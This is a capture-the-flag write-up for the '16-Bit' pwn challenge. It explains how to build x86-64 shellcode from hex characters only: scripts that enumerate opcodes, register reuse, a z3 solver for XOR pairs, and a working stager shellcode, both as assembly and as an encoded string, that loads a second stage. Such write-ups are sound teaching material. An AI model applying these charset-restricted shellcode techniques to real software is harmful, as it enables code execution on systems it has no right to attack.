<h1>16-Bit</h1>
<i>During the ICC competition we where given a shellcoding challenge to make a base64 encoded shellcode, ie the shellcode could only consist of the characters "a-zA-Z0-9+/=", during an 8 hour ctf we completed it in about 1.5 hours. How long will it take you to create base16 shellcode?</i>

Provided: chal + libc.so.6

tl;dr: Xor the hell out of everything


Disclaimer: I did not solve this challenge during the CTF. After the CTF ended skimmed over these writeups and chatted with another solver. My approach was pretty similar to the second writeup.

https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/CyberOpen22/16-bit

https://ctftime.org/writeup/34583



<h2>Analysis</h2>

This binary was very straight forward and the prompt hinted that this would be shellcodeing with hex characters only.
```hlil
int32_t main(int32_t argc, char** argv, char** envp)
    setup()
    int64_t rax_1 = mmap(addr: 0x133713370000, len: 0x1000, prot: 7, flags: 0x32, fd: 0xffffffff, offset: 0)
    if (rax_1 == 0x133713370000)
        read(fd: 0, buf: rax_1, nbytes: 0x64)
        encode(rax_1)
        rax_1()
        return 0
    puts(str: "mmap failed")
    exit(status: 0xffffffff)
    noreturn
```

Testing this by dumping random shellcode and it converts the bytes into the hex string variable of the input. One note was that the characters are upper case instead of lowercase

```python 
[ins] In [3]: p.sendline(b'ABCDEF1337')

[ins] In [4]: lo()
rax: 0x133713370000 →  "41424344454631333337000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
rsi: 0x133713370000 →  "41424344454631333337000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
rcx: 0x55abcf458060 →  "0123456789ABCDEF"
rdx: 0x1337133700c6
rbx: 0x0

->  0x133713370000: 34 31  xor    al, 0x31
    0x133713370002: 34 32  xor    al, 0x32
    0x133713370004: 34 33  xor    al, 0x33
    0x133713370006: 34 34  xor    al, 0x34
    0x133713370008: 34 35  xor    al, 0x35
```

<h2>Valid Optcodes</h2>
Since we have a rather limited charset of "0123456789ABCDEF" I wanted to know all possible instructions using these opcodes. I noticed most of these were XOR instructions so wrote a script to get all possible permutations of these bytes. I then used the pwn.disasm module to disassemble them. One thing to note is that I padded it with a lot of nops so opcodes didn't collide with each other
```python 
from pwn import *
from itertools import permutations

perm = []

for i in range(5):
    perm.append(list(permutations(list("0123456789ABCDEF"),i)))


optcodes = b""


for l in perm:
    for i in l:
        optcodes += "".join(i).encode('latin') + b'\x90'*10

context.arch = 'amd64'
print(disasm(optcodes))
```

After running this script we got a gigantic file, using more filtering using grep I had a pretty good list of good opcodes. One thing to note is that from the other writeups it was pretty obvious that XOR was the way to win so I filtered out all the cmp, xchg and rex instructions.
```bash 
python3 find_ops.py > optcodes
grep -v 90 optcodes  > optcodes2
grep -v bad optcodes2 > optcodes3
grep -v cmp optcodes3 > optcodes4
grep -v rex optcodes4 > optcodes5
sed 's/^.\{16\}//' optcodes5 > optcodes6 
sort optcodes6 | uniq > optcodes7
grep -v \* optcodes7 > optcodes8
```

The overall idea of this challenge is to use XOR to set a register to a write value and another one to an address to write. Using this write primitive we can write a stager shellcode that allows us to read in more shellcode.

A major part of this challenge was reusing the registers that already existed, one thing to note is that on Ubuntu 22.04 the rbx value is NOT `__libc_csu_init`, instead its null. I know on remote this was true so I patched it using binja and gdb.

```gdb 
$rax   : 0x00133713370000  →  "41420A00000000000000000000000000000000000000000000[...]"
$rbx   : 0x00556cf516b450  →  <__libc_csu_init+0> push r15
$rsi   : 0x00133713370000  →  "41420A00000000000000000000000000000000000000000000[...]"
$rcx   : 0x00556cf516e060  →  "0123456789ABCDEF"
$rdx   : 0x001337133700c6  →  0x00000000003030 ("00"?)


$rsp   : 0x007ffdc37f1b48  →  0x00556cf516b447  →  <main+150> mov eax, 0x0
$rbp   : 0x007ffdc37f1b60  →  0x0000000000000000
$rdi   : 0x007ffdc37f1ab0  →  0x000000000a4241 ("AB\n"?)
$rip   : 0x00133713370000  →  "41420A00000000000000000000000000000000000000000000[...]"
$r8    : 0xffffffff
$r9    : 0x0
$r10   : 0x00556cf516a5a9  →  0x65766f6d6d656d ("memmove"?)
$r11   : 0x007f4e51f7b6e0  →  <__memmove_avx_unaligned_erms+0> endbr64
$r12   : 0x00556cf516b0b0  →  <_start+0> xor ebp, ebp
$r13   : 0x007ffdc37f1c50  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0

rax/rsi->Shellcode
rbx->csu
rcx->BSS string
rdx->End
```



The "null" instructions is effectivley a NOP if rax points to valid memory
`xor    byte ptr [rax], dh`

Looking through the shellcode there is a lot of instructions in this shape, this could be used as a write.
`xor    DWORD PTR [rcx+0x43], eax`

On top of that, theirs are a lot of instructions to modify eax so I used that as the write value registers.

Instead of setting up a register with an address to write to I this one as rdx is the end of our shellcode so + 0x30 should be a good spot.
`xor    DWORD PTR [rdx+0x30], eax`


To modify the rax register there were direct XOR's but only in the allowed range. Using this range alone it's impossible to generate the syscall instruction so we need more.
`xor    DWORD PTR [rbx+0x30], eax`

Rbx points to csu_init and there are instructions to dereference it and xor with eax. 
`xor    eax, DWORD PTR [rbx+0x30]`


This means that we can also use bytes that are inside of csu_init

```python 
[nav] In [17]: print(p.execute_backend_command("x/20bx $rbx+0x30"))
0x55abcf455480: 0x03 0x74 0x1b 0x31 0xdb 0x0f 0x1f 0x00
0x55abcf455488: 0x4c 0x89 0xf2 0x4c 0x89 0xee 0x44 0x89
0x55abcf455490: 0xe7 0x41 0xff 0x14
```

Hence the write primitive would look something like this

```assembly 
xor al, 0x41
xor al, BYTE PTR [rbx+ 0x30 ]
xor BYTE PTR [rdx+ 0x30 ], al
```

Out stager shellcode can be very short as most of the registers for a read syscall are already in place.
Rsi is pointing to the shellcode buffer, rdx is pointing to the end so it a large amount for read count. We just need to null rdi, rax and call syscall for our final shellcode.

Since rsi is already pointing to the shellcode buffer can just not touch it for the read syscall. Rdx points to the end so it's already a big number for read count

I had to keep in mind that we only have access to a certain range so used this to cycle through csu_init and grab only the bytes we have access to
```python 
for i in range(0x31, 0x50 ):
    if i in opts:
        csu.append((u8(p.bv.read( p.bv.symbols['__libc_csu_init'][0].address+i, 1))))
    else:
        csu.append(0)
```

This gave us a pretty nice range of opcodes, in the end, we had all of these

```python 
csu = [0x74, 0x1B, 0x31, 0xDB, 0xF, 0x1F, 0x0, 0x4C, 0x89, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xFF, 0x14, 0xDF, 0x48, 0x83, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]
opts= b"0123456789ABCDEF"
```

Manually finding a valid combination to get shellcode bytes worried me but z3 came to the rescue, surprisingly this worked for all the bytes.
```python 
import z3
def find_valid(target : int):
    s = z3.Solver()
    x = z3.BitVec('x', 32)
    y = z3.BitVec('y', 32)

    s.add( z3.Or([ x ==i for i in csu + [ a for a in opts] ]))

    s.add( z3.Or([ y ==i for i in csu + [ a for a in opts] ]))

    s.add(x ^ y== target)
    print(s.check())
    print(s.model())
    return (s.model()[x].as_long(), s.model()[y].as_long())
```


With these two in hand, we could construct a shellcode that would xor the output from find_valid and then move it after the end of the shellcode. Hence after this setup, it would have a fake nop sled until it hit our shellcode.

<h3>Things to Note:</h3>

- Lists in python are 0-based, the indexes into the csu might be one-off depending on how you add the values. Adding a 0 to pad the beginning of the csu array fixed this.
- The original csu xor optode didn't work as XORing eax would result in the upper bits of rax also getting nulled out. Without the upper bits of rax the nop sled would be invalid. Luckily the single byte version was also valid shellcode

    `xor eax, DWORD PTR [rbx+0x30]`

    `xor al, BYTE PTR [rbx+0x30]`

- The read will read into the beginning of our shellcode, so we need to have a nop sled so we overwrite the current RIP.
- After each write rax needs to be accounted for or cleared out, z3 either needs to know the old rax value or we could just rexor as x ^ y ^x ^y is still 0.
- Using 0 as padding in csu was a bad idea but hard coding in the csu index of null fixes this.


Final Shellcode
```assembley 
xor al, 49
xor al, BYTE PTR [rbx+55 ]
xor BYTE PTR [rdx+ 48 ], al
xor al, 49
xor al, BYTE PTR [rbx+55 ]
xor al, BYTE PTR [rbx+50 ]
xor al, BYTE PTR [rbx+52 ]
xor BYTE PTR [rdx+ 49 ], al
xor al, BYTE PTR [rbx+50 ]
xor al, BYTE PTR [rbx+52 ]
xor al, BYTE PTR [rbx+49 ]
xor al, 69
xor BYTE PTR [rdx+ 50 ], al
xor al, BYTE PTR [rbx+49 ]
xor al, 69
xor al, BYTE PTR [rbx+66 ]
xor al, BYTE PTR [rbx+55 ]
xor BYTE PTR [rdx+ 51 ], al
xor al, BYTE PTR [rbx+66 ]
xor al, BYTE PTR [rbx+55 ]
xor al, 57
xor al, 54
xor BYTE PTR [rdx+ 52 ], al
xor al, 57
xor al, 54
xor al, 70
xor al, 67
xor BYTE PTR [rdx+ 53 ], al
xor al, 70
xor al, 67
```

Final Shellcode encoded
```python 
b"412C70B0412C72C22C40B12C22C42C14E0B22C14E2CB2C70B32CB2C749460B449464F4C0B54F4C"
```

NOTE:
The original exploit use pinja a homebrew combination of pwn tools and binary ninja's debugger. If you happen to own Binary Ninja commerial and would like to try it out <https://github.com/ex4722/pinja>.Pwn2.py uses the regular version of pwn tools.
